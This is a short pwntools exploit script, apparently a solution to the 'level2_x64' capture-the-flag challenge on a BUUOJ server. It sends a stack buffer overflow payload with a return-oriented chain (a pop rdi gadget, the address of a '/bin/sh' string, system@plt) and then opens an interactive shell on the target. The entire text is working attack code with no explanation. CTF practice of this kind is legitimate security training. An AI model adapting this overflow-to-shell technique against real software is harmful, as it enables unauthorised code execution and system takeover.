from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

if args.LOCAL:
    p = process("./level2_x64")
else:
    p = remote("node3.buuoj.cn", 28352)

e = ELF("level2_x64")
binshAddr = 0x600a90
system = e.plt["system"]
pop_rdi = 0x4006b3

payload = b'a'*(0x80+8)+p64(pop_rdi)+p64(binshAddr)+p64(system)

p.sendlineafter('Input:\n', payload)
p.interactive()